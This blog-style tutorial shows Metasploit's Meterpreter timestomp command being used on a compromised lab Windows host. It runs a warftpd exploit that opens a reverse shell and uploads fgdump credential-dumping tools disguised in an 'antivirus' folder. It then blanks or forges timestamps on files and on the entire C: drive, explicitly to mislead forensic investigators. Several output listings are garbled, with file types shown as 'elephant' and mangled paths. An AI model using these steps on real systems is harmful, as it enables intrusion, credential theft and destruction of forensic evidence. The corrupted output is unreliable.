---
draft: false
title: MSF Timestomp
linkTitle: MSF Timestomp
translationKey: msf-timestomp
weight: 330
date: 2017-06-05T13:37:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, we will examine how to use the timestomp command.
url: /msf-timestomp/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## What is TimeStomp?

Pentesting any system requires interacting with that system. With every operation you perform, you leave traces on the target system. Examining these traces attracts the attention of forensics researchers. The timestamps of files are one of them. Meterpreter provides a command called `timestomp` to clean or at least mix up these traces.

The best way to not leave traces is to not touch the system at all. Meterpreter normally runs on RAM and does not touch the disk. However, as a result of some file operations you perform, time logs will inevitably be created. In this article, we will see how to manipulate the time records of files using the `timestomp` command.

Each file is kept in 3 different time records for Windows as Modified, Accesed and Changed. We can call these MAC times by their first letters. Do not confuse them with the MAC address of the network card.

Let's look at the MAC times of a file in Windows.

```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 5/3/2009 2:30:08 AM
Last Accessed: 5/3/2009 2:31:39 AM
Last Modified: 5/3/2009 2:30:36 AM
```

Above, we can see the time records of the file named `test.txt`. Now, let's assume that we have logged into `Meterpreter` on this system using the `warftpd_165_user` module.

```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1218)
meterpreter > use priv
Loading extension priv...success.
```

After the Meterpreter shell is opened, you can view the help information with the `timestomp -h` command.

```bash
meterpreter > timestomp -h

Usage: timestomp OPTIONS file_path

OPTIONS:

 -a Set the "last accessed" time of the file
 -b Set the MACE timestamps so that EnCase shows blanks
 -c Set the "creation" time of the file
 -e Set the "mft entry modified" time of the file
 -f Set the MACE of attributes equal to the supplied file
 -h Help banner
 -m Set the "last written" time of the file
 -r Set the MACE timestamps recursively on a directory
 -v Display the UTC MACE values ​​of the file
 -z Set all four attributes (MACE) of the file
```

Now, let's go to the folder where the `test.txt` file we gave the example above is located.

```bash
meterpreter > pwd
C:\Program Files\War-ftpd
meterpreter > cd ..
meterpreter > pwd
C:Program Files
meterpreter > cd ..
meterpreter > cd Documents\ and\Settings
meterpreter > cd P0WN3D
meterpreter > cd My\Documents
meterpreter > ls

Listing: C:\Documents and Settings\P0WN3D\My Documents
**==========================================================**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 .
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 ..
40555/r-xr-xr-x 0 dir Wed Dec 31 19:00:00 -0500 1969 My Pictures
100666/rw-rw-rw- 28 fil Wed Dec 31 19:00:00 -0500 1969 test.txt
```

You can view the time information of the `test.txt` file in the current folder with the `-v` option.

```bash
meterpreter > timestomp test.txt -v
Modified      : Sun May 03 04:30:36 -0400 2009
Accessed      : Sun May 03 04:31:51 -0400 2009
Created       : Sun May 03 04:30:08 -0400 2009
Entry Modified: Sun May 03 04:31:44 -0400 2009
```

Imagine that you created this file. You may want to change it. Now let's try to change this time information. The first way to do this is to copy the time information of another file in the system to the `test.txt` file.

For example, let's copy the time information of the `cmd.exe` file to the `test.txt` time information. To do this, you can execute the following command with the `-f` option.

```bash
meterpreter > timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
> Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
meterpreter > timestomp test.txt -v
Modified : Tue Dec 07 08:00:00 -0500 1999
Accessed : Sun May 03 05:14:51 -0400 2009
Created : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009
```

The process is completed. Let's see if it's actually copied.

```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 12/7/1999 7:00:00 AM
Last Accessed: 5/3/2009 3:11:16 AM
Last Modified: 12/7/1999 7:00:00 AM
```

As you can see, the MAC time information of the `test.txt` file is the same as the `cmd.exe` file.

If you are a careful user, you may have noticed that when you look at the file from the Windows command line and the Linux command line, the date information is the same, but the time information is different. This difference is due to the difference in the `timezone` time zones.

It should also be emphasized that the `accessed time` value of the `test.txt` file is immediately updated to the new date since we checked the file information. It would be appropriate to emphasize how variable and important time records are for Windows.

Now let's use a different technique. The `-b` option offered by `timestomp` helps you set the time information to be empty. In the example below, you can see the current state of the file and the time information after the `timestomp test.txt -b` command.

```bash
meterpreter > timestomp test.txt -v
Modified : Tue Dec 07 08:00:00 -0500 1999
Accessed : Sun May 03 05:16:20 -0400 2009
Created : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009

meterpreter > timestomp test.txt -b
> Blanking file MACE attributes on test.txt
meterpreter > timestomp test.txt -v
Modified : 2106-02-06 23:28:15 -0700
Accessed : 2106-02-06 23:28:15 -0700
Created : 2106-02-06 23:28:15 -0700
Entry Modified: 2106-02-06 23:28:15 -0700
```

As you can see, the files have received time information for the year 2106. While this view is like this from the Meterpreter command line, let's see how it looks in Windows.

```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 1/1/1601
Last Accessed: 5/3/2009 3:21:13 AM
Last Modified: 1/1/1601
```

In Linux Meterpreter, the year 2106 is seen as 1601 in Windows. You can examine the reason for this difference on the [Additional information](http://en.wikipedia.org/wiki/1601#Notes) page.

## Another Example

Now, let's create a `WINNT\\antivirus\\` folder in Windows from our meterpreter command line and upload a few files into it.

```bash
meterpreter > cd C:\\WINNT
meterpreter > mkdir antivirus
Creating directory: antivirus
meterpreter > cd antivirus
meterpreter > pwd
C:\WINNT\antivirus
meterpreter > upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
> uploading: /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
> uploaded: /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
> uploading: /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
>uploaded: /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
> uploading: /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
> uploaded: /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
meterpreter > ls

Listing: C:\WINNT\antivirus
**===========================**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100777/rwxrwxrwx 174080 elephant 2017-05-09 15:23:19 -0600 cachedump64.exe
100777/rwxrwxrwx 57344 fil 2017-05-09 15:23:20 -0600 pstgdump.exe
100777/rwxrwxrwx 57344 fil 2017-05-09 15:23:18 -0600 servpw.exe
meterpreter > cd ..
```

Now we have 3 `exe` files that we uploaded to the `antivirus` folder in Windows. Let's look at their timestamps.

```bash
meterpreter > timestomp antivirus\\servpw.exe -v
Modified      : 2017-05-09 16:23:18 -0600
Accessed      : 2017-05-09 16:23:18 -0600
Created       : 2017-05-09 16:23:18 -0600
Entry Modified: 2017-05-09 16:23:18 -0600
meterpreter > timestomp antivirus\\pstgdump.exe -v
Modified      : 2017-05-09 16:23:20 -0600
Accessed      : 2017-05-09 16:23:19 -0600
Created       : 2017-05-09 16:23:19 -0600
Entry Modified: 2017-05-09 16:23:20 -0600
```

You can empty the timestamp of all files in a folder using the `-r` option of the `timestomp` command.

```bash
meterpreter > timestomp antivirus -r
> Blanking directory MACE attributes on antivirus

meterpreter > ls
40777/rwxrwxrwx 0 dir 1980-01-01 00:00:00 -0700 ..
100666/rw-rw-rw- 115 fil 2106-02-06 23:28:15 -0700 servpw.exe
100666/rw-rw-rw- 12165 fil 2106-02-06 23:28:15 -0700 pstgdump.exe
```

We changed or made the timestamp blank with the methods described above, but careful forensics researchers will notice this oddity.

Instead, you may want to consider changing the timestamp of the entire system. In this case, it will be completely confused as to which file was created or modified and when. Since there is no other file to compare it to, things will get even more complicated.

This situation clearly shows that there is an intervention in the system, and it will make the job of forensics investigators difficult.

## Changing the Time Information of the Entire System

```bash
meterpreter > pwd
C:WINNT\antivirus
meterpreter > cd ../..
meterpreter > pwd
C:
meterpreter > ls

Listing: C:\
**=============**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100777/rwxrwxrwx 0 fil Wed Dec 31 19:00:00 -0500 1969 AUTOEXEC.BAT
100666/rw-rw-rw- 0 fil Wed Dec 31 19:00:00 -0500 1969 CONFIG.SYS
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 Documents and Settings
100444/r--r--r-- 0 fil Wed Dec 31 19:00:00 -0500 1969 IO.SYS
100444/r--r--r-- 0 fil Wed Dec 31 19:00:00 -0500 1969 MSDOS.SYS
100555/r-xr-xr-x 34468 fil Wed Dec 31 19:00:00 -0500 1969 <a href="http://ntdetect.com/">NTDETECT.COM</a>
40555/r-xr-xr-x 0 dir Wed Dec 31 19:00:00 -0500 1969 Program Files
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 RECYCLER
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 System Volume Information
40777/rwxrwxrwx 0 dir Wed Dec 31 19:00:00 -0500 1969 WINNT
100555/r-xr-xr-x 148992 fil Wed Dec 31 19:00:00 -0500 1969 arcldr.exe
100555/r-xr-xr-x 162816 fil Wed Dec 31 19:00:00 -0500 1969 arcsetup.exe
100666/rw-rw-rw- 192 fil Wed Dec 31 19:00:00 -0500 1969 boot.ini
100444/r--r--r-- 214416 fil Wed Dec 31 19:00:00 -0500 1969 ntldr
100666/rw-rw-rw- 402653184 fil Wed Dec 31 19:00:00 -0500 1969 pagefile.sys

meterpreter > timestomp C:\\ -r
> Blanking directory MACE attributes on C:\
meterpreter > ls
meterpreter > ls

listing: C:\
**============**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100777/rwxrwxrwx 0 elephants 2106-02-06 23:28:15 -0700 AUTOEXEC.BAT
100666/rw-rw-rw- 0 fil 2106-02-06 23:28:15 -0700 CONFIG.SYS
100666/rw-rw-rw- 0 fil 2106-02-06 23:28:15 -0700 Documents and Settings
100444/r--r--r-- 0 elephants 2106-02-06 23:28:15 -0700 IO.SYS
100444/r--r--r-- 0 fil 2106-02-06 23:28:15 -0700 MSDOS.SYS
100555/r-xr-xr-x 47564 fil 2106-02-06 23:28:15 -0700 <a href="http://ntdetect.com/">NTDETECT.COM</a>
...snip...
```

You can see that the timestamp of all files on the C drive has been changed with the `timestomp C:\\ -r` command.

Smart forensics investigators look in other places than just timestamp. There are several different logging mechanisms within Windows.
